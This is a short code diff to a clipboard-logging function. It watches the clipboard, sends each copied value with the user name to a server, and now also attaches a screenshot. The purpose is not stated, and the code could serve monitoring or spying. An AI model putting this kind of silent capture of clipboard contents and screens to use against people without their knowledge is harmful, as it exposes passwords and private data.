@@ -25,13 +25,15 @@ def logClipboard():
         if temp_value != recent_value:
             recent_value = temp_value
             print(f"{timestamp()} {USER} Clipboard copy {recent_value}")
+            screenshot = takeScreenshot()
             session.post(consumerServer.SERVER_ADDR, json={
                 "timestamp": timestamp(),
                 "user": USER,
                 "category": "Clipboard",
                 "application": "Clipboard",
                 "event_type": "copy",
-                "clipboard_content": recent_value
+                "clipboard_content": recent_value,
+                "screenshot": screenshot
             })
         sleep(0.2)
 
